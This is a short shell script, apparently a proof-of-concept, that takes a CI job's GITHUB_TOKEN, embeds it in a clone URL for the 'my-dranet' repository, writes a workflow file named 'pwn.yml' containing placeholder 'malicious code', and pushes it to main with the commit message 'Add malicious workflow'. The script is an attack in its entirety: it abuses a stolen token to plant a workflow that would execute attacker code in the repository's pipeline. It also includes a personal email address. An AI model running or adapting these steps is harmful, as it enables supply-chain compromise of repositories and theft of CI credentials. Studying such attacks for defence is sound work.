# Extract the repo token
TOKEN=$GITHUB_TOKEN
# Modify workflow to run their code on main
git config --global user.email "shreyapohekar@gmail.com"
git config --global user.name "shreyapohekar"
git clone https://shreyapohekar:$TOKEN@github.com/shreyapohekar/my-dranet.git
cd my-dranet
echo 'malicious code' > .github/workflows/pwn.yml
git add .github/workflows/pwn.yml
git commit -m "Add malicious workflow"
git push origin main
